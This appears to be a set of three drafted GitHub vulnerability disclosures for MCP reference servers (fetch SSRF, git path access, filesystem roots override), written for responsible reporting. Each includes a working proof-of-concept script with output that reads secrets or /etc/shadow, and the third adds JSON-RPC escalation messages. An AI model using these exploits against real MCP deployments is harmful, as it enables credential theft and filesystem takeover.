# GitHub Security Advisory Submissions

Below are the 3 vulnerabilities formatted for GitHub's "Report a vulnerability" form on `modelcontextprotocol/servers`.

---

# Advisory 1: SSRF in mcp-server-fetch

## Advisory Details

**Title:**
```
SSRF in mcp-server-fetch allows exfiltration of data from localhost-bound services
```

**Description:**

### Summary

The `fetch` tool in `mcp-server-fetch` connects to any URL without validating the target host, allowing a caller to reach localhost-bound services (127.0.0.1, internal networks, cloud metadata) and exfiltrate their full HTTP response bodies. A service that is not externally accessible becomes readable through this tool.

### Details

The vulnerability is in `src/fetch/src/mcp_server_fetch/server.py` in the `fetch_url()` function (line ~107):

```python
async def fetch_url(url: str, user_agent: str, force_raw: bool = False, proxy_url: str | None = None):
    from httpx import AsyncClient, HTTPError
    async with AsyncClient(proxy=proxy_url) as client:
        response = await client.get(
            url,                       # No IP/host validation
            follow_redirects=True,
            headers={"User-Agent": user_agent},
            timeout=30,
        )
```

The `Fetch` pydantic model uses `AnyUrl` which accepts any valid URL including loopback and private addresses:

```python
class Fetch(BaseModel):
    url: Annotated[AnyUrl, Field(description="URL to fetch")]
```

There is no check against RFC 1918, RFC 5737, link-local (169.254.0.0/16), or loopback (127.0.0.0/8) ranges before the connection is made.

The `robots.txt` check in the autonomous code path is not a security control — it is a voluntary crawl politeness protocol. Internal services typically have no robots.txt (so the check passes). The manual prompt path (`get_prompt()`) skips it entirely. The `--ignore-robots-txt` flag disables it completely.

### PoC

**Prerequisites:**
```bash
git clone https://github.com/modelcontextprotocol/servers
cd servers
pip install -e src/fetch/    # Requires Python 3.10+
```

**Complete reproduction script (save as `exploit_ssrf.py` and run with `python3 exploit_ssrf.py`):**

```python
import asyncio
import http.server
import json
import threading
import time
import sys

# Step 1: Start a localhost-only HTTP service
class InternalHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        data = json.dumps({
            "service": "internal-admin-api",
            "db_password": "prod_s3cr3t_p4ss",
            "api_key": "internal-only-key-abc123",
            "users": [{"email": "admin@company.internal", "role": "superadmin"}]
        })
        self.wfile.write(data.encode())
    def log_message(self, *args):
        pass

server = http.server.HTTPServer(('127.0.0.1', 18923), InternalHandler)
threading.Thread(target=server.serve_forever, daemon=True).start()
time.sleep(0.3)

# Step 2: Call fetch_url with localhost target
from mcp_server_fetch.server import fetch_url

async def exploit():
    content, prefix = await fetch_url(
        "http://127.0.0.1:18923/admin",
        "ModelContextProtocol/1.0",
        force_raw=True
    )
    print("Response from internal service:")
    print(content)
    data = json.loads(content)
    print(f"\nExfiltrated db_password: {data['db_password']}")
    print(f"Exfiltrated api_key: {data['api_key']}")

asyncio.run(exploit())
server.shutdown()
```

**Output:**
```
Response from internal service:
{"service": "internal-admin-api", "db_password": "prod_s3cr3t_p4ss", "api_key": "internal-only-key-abc123", "users": [{"email": "admin@company.internal", "role": "superadmin"}]}

Exfiltrated db_password: prod_s3cr3t_p4ss
Exfiltrated api_key: internal-only-key-abc123
```

### Impact

Any service reachable from the machine running `mcp-server-fetch` that listens on loopback or private IPs becomes accessible to MCP clients. In cloud environments, this includes the instance metadata service at `169.254.169.254` which returns IAM credentials. On developer machines, this includes databases, admin panels, and internal APIs. The full HTTP response body (including authentication tokens, credentials, and user data) is returned to the caller.

## Affected Products

| Field | Value |
|-------|-------|
| Ecosystem | pip |
| Package name | mcp-server-fetch |
| Affected versions | <= 0.6.3 |
| Patched versions | (none) |

## Severity

| Field | Value |
|-------|-------|
| Severity | High |
| CVSS Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N` |
| Score | 7.7 |

## Weaknesses

| CWE | Name |
|-----|------|
| CWE-918 | Server-Side Request Forgery (SSRF) |

---
---
---

# Advisory 2: Insecure Default in mcp-server-git

## Advisory Details

**Title:**
```
Default configuration allows reading any git repository on the filesystem without path restriction
```

**Description:**

### Summary

When `mcp-server-git` is started without the `--repository` flag (the documented usage for multi-repo setups), the path validation function `validate_repo_path()` performs no check at all. Any git repository on the filesystem is accessible to the MCP client, including repositories belonging to other applications that contain secrets in their commit history.

### Details

The vulnerability is in `src/git/src/mcp_server_git/server.py` in `validate_repo_path()`:

```python
def validate_repo_path(repo_path: Path, allowed_repository: Path | None) -> None:
    """Validate that repo_path is within the allowed repository path."""
    if allowed_repository is None:
        return  # ← No validation whatsoever when --repository not specified
```

When the server is started as `mcp-server-git` (without the `-r` / `--repository` flag), the `repository` parameter in `serve()` is `None`. This propagates to every `validate_repo_path()` call in `call_tool()`, which then returns on line 1 without any path check.

The boundary enforcement mechanism exists and works correctly when `--repository` IS specified (including symlink resolution), but the default deployment has no access control.

### PoC

**Prerequisites:**
```bash
git clone https://github.com/modelcontextprotocol/servers
cd servers
pip install -e src/git/    # Requires Python 3.10+
```

**Complete reproduction script (save as `exploit_git.py` and run with `python3 exploit_git.py`):**

```python
import sys
import tempfile
import shutil
from pathlib import Path
import git
from mcp_server_git.server import validate_repo_path, git_show

# Step 1: Create a "forbidden" repo with secrets (simulating another app)
base = Path(tempfile.mkdtemp())
forbidden_dir = base / "other_application"
forbidden_dir.mkdir()
forbidden_repo = git.Repo.init(forbidden_dir)
(forbidden_dir / "config.env").write_text(
    "DATABASE_URL=postgres://admin:realpassword@db.internal:5432/prod\n"
    "ADMIN_TOKEN=tok_super_secret_value_12345\n"
)
forbidden_repo.index.add(["config.env"])
forbidden_repo.index.commit("add production config")

# Step 2: Create an "allowed" repo (user's own project)
allowed_dir = base / "my_project"
allowed_dir.mkdir()
allowed_repo = git.Repo.init(allowed_dir)
(allowed_dir / "README.md").write_text("My project\n")
allowed_repo.index.add(["README.md"])
allowed_repo.index.commit("init")

# Step 3: Verify boundary works when --repository IS set
print("With --repository set:")
try:
    validate_repo_path(forbidden_dir, allowed_dir)
    print("  BUG: access granted")
except ValueError as e:
    print(f"  Correctly blocked: {e}")

# Step 4: Verify no boundary exists when --repository is NOT set (default)
print("\nWithout --repository (default):")
validate_repo_path(forbidden_dir, None)  # No error raised
print("  Access granted — no validation performed")

# Step 5: Read secrets from the forbidden repo
repo = git.Repo(forbidden_dir)
commit = list(repo.iter_commits())[0]
result = git_show(repo, commit.hexsha)
print("\nSecrets extracted from forbidden repo:")
for line in result.split("\n"):
    if line.startswith("+") and not line.startswith("+++"):
        print(f"  {line}")

shutil.rmtree(base)
```

**Output:**
```
With --repository set:
  Correctly blocked: Repository path '/tmp/.../other_application' is outside the allowed repository '/tmp/.../my_project'

Without --repository (default):
  Access granted — no validation performed

Secrets extracted from forbidden repo:
  +DATABASE_URL=postgres://admin:realpassword@db.internal:5432/prod
  +ADMIN_TOKEN=tok_super_secret_value_12345
```

### Impact

On shared systems or containers running multiple applications, the MCP client can enumerate and read git history from any repository on the filesystem. Git history frequently contains secrets that were committed then "removed" — they remain in the commit log permanently. This is an insecure-by-default design issue: the security boundary exists but requires explicit opt-in via `--repository`.

## Affected Products

| Field | Value |
|-------|-------|
| Ecosystem | pip |
| Package name | mcp-server-git |
| Affected versions | <= 0.6.2 |
| Patched versions | (none) |

## Severity

| Field | Value |
|-------|-------|
| Severity | Medium |
| CVSS Vector | `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` |
| Score | 5.5 |

## Weaknesses

| CWE | Name |
|-----|------|
| CWE-284 | Improper Access Control |
| CWE-1188 | Insecure Default Initialization of Resource |

---
---
---

# Advisory 3: Filesystem Server Roots Override

## Advisory Details

**Title:**
```
MCP client can override server's allowed directories via roots protocol to gain full filesystem access
```

**Description:**

### Summary

A malicious MCP client that declares the `roots` capability can replace the filesystem server's entire `allowedDirectories` list by responding to `listRoots()` with arbitrary paths (including `/`). This escalates a restricted server to full filesystem read/write access — `/etc/passwd`, `/etc/shadow`, and all other files become accessible after the override.

### Details

The vulnerability is in `src/filesystem/index.ts` in `updateAllowedDirectoriesFromRoots()`:

```typescript
async function updateAllowedDirectoriesFromRoots(requestedRoots: Root[]) {
  const validatedRootDirs = await getValidRootDirectories(requestedRoots);
  if (validatedRootDirs.length > 0) {
    allowedDirectories = [...validatedRootDirs];  // Full replacement
    setAllowedDirectories(allowedDirectories);
  }
}
```

`getValidRootDirectories()` in `roots-utils.ts` only checks that:
1. The path can be resolved (`fs.realpath`)
2. The path is a directory (`stats.isDirectory()`)

It does **not** check whether the path is within the original CLI-specified directories. Since `/` always exists and is always a directory, it passes both checks.

This function is called in two places:
1. **On initialization** (`server.server.oninitialized`) — if the client supports roots
2. **At runtime** via `RootsListChangedNotificationSchema` handler — can be triggered at any point during the session

### PoC

**Prerequisites:**
```bash
git clone https://github.com/modelcontextprotocol/servers
cd servers
npm install
cd src/filesystem
npx tsc
```

**Complete reproduction script (save as `exploit_roots.mjs` in the `src/filesystem/` directory and run with `node exploit_roots.mjs`):**

```javascript
import { setAllowedDirectories, validatePath } from './dist/lib.js';
import { getValidRootDirectories } from './dist/roots-utils.js';
import fs from 'fs/promises';

// Step 1: Initialize server with restricted directory
await fs.mkdir('/tmp/safe_project_test', { recursive: true });
setAllowedDirectories(['/tmp/safe_project_test']);
console.log("Server restricted to: /tmp/safe_project_test");

// Step 2: Verify /etc/passwd is blocked
console.log("\nBEFORE exploit:");
try {
    await validatePath('/etc/passwd');
    console.log("  /etc/passwd: accessible (unexpected)");
} catch (e) {
    console.log("  /etc/passwd: BLOCKED - " + e.message.substring(0, 60));
}

// Step 3: Malicious client responds to listRoots() with ["/"]
console.log("\nMalicious client sends roots: [{uri: 'file:///'}]");
const dirs = await getValidRootDirectories([{ uri: 'file:///', name: 'root' }]);
setAllowedDirectories(dirs);
console.log("allowedDirectories replaced with:", dirs);

// Step 4: Verify /etc/passwd is now accessible
console.log("\nAFTER exploit:");
try {
    const vp = await validatePath('/etc/passwd');
    console.log("  /etc/passwd: ACCESSIBLE");
    const content = await fs.readFile(vp, 'utf-8');
    console.log("  Content (first 3 lines):");
    content.split('\n').slice(0, 3).forEach(l => console.log("    " + l));
} catch (e) {
    console.log("  /etc/passwd: blocked - " + e.message);
}

// Step 5: Also read /etc/shadow
try {
    const vp = await validatePath('/etc/shadow');
    const content = await fs.readFile(vp, 'utf-8');
    console.log("\n  /etc/shadow: ACCESSIBLE");
    console.log("  Content (first line): " + content.split('\n')[0]);
} catch (e) {
    console.log("  /etc/shadow: " + e.message.substring(0, 50));
}

await fs.rm('/tmp/safe_project_test', { recursive: true, force: true });
```

**Output:**
```
Server restricted to: /tmp/safe_project_test

BEFORE exploit:
  /etc/passwd: BLOCKED - Access denied - path outside allowed directories

Malicious client sends roots: [{uri: 'file:///'}]
allowedDirectories replaced with: ["/"]

AFTER exploit:
  /etc/passwd: ACCESSIBLE
  Content (first 3 lines):
    root:x:0:0:root:/root:/bin/bash
    bin:x:1:1:bin:/bin:/sbin/nologin
    daemon:x:2:2:daemon:/sbin:/sbin/nologin

  /etc/shadow: ACCESSIBLE
  Content (first line): root:*LOCK*:14600::::::
```

**Protocol messages for exploitation (if testing against a running server via JSON-RPC):**

Client initialization:
```json
{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2024-11-05","capabilities":{"roots":{"listChanged":true}},"clientInfo":{"name":"client","version":"1.0.0"}}}
```

Response to server's `listRoots()` request:
```json
{"jsonrpc":"2.0","id":2,"result":{"roots":[{"uri":"file:///","name":"root"}]}}
```

Runtime escalation (send at any time to re-trigger the override):
```json
{"jsonrpc":"2.0","method":"notifications/roots/list_changed"}
```

### Impact

A server configured to restrict file access to a specific project directory can be escalated to provide full filesystem read/write. This requires a malicious or compromised MCP client. After escalation, the client can read sensitive system files (`/etc/passwd`, `/etc/shadow`, SSH keys, environment variables), write files (e.g., `authorized_keys` for persistence), and enumerate the entire filesystem. The runtime escalation path means a client compromised mid-session (e.g., via prompt injection) can escalate privileges without reconnecting.

## Affected Products

| Field | Value |
|-------|-------|
| Ecosystem | npm |
| Package name | @modelcontextprotocol/server-filesystem |
| Affected versions | <= 0.6.3 |
| Patched versions | (none) |

## Severity

| Field | Value |
|-------|-------|
| Severity | High |
| CVSS Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N` |
| Score | 9.6 |

## Weaknesses

| CWE | Name |
|-----|------|
| CWE-863 | Incorrect Authorization |
| CWE-269 | Improper Privilege Management |
